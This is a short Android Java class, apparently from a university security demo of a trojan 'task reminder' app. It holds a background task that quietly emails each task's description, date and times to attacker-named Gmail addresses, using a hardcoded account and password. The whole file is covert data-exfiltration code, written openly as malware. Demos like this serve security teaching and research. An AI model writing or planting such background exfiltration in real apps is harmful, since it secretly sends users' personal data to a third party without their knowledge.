package edu.cmu.malicioustaskreminder;

import android.os.AsyncTask;
import android.util.Log;

public class MaliciousSendMailTask extends AsyncTask<TaskDetails, Void, Void> {

	@Override
	protected Void doInBackground(TaskDetails... tasks) {
		try {   
			TaskDetails task = tasks[0];
            GmailSender sender = new GmailSender("malicousattacker@gmail.com", "Qwertyuiop123");
            sender.sendMail("Greetings supreme master!!",   
                    "Your unfortunate minion has added the following task:\n\n\t "+ "Details: "+task.getDescription()
                    +"\n\t Date: " + task.getDateString() + "\n\t Start Time: " + task.getFromTimeString() +
                    "\n\t End Time: " + task.getToTimeString(),   
                    "malicousattacker@gmail.com",   
                    "illuminati.assassin@gmail.com");   
        } catch (Exception e) {   
            Log.e("SendMail", e.getMessage(), e);   
        } 
		return (Void)null;
		
	}

}
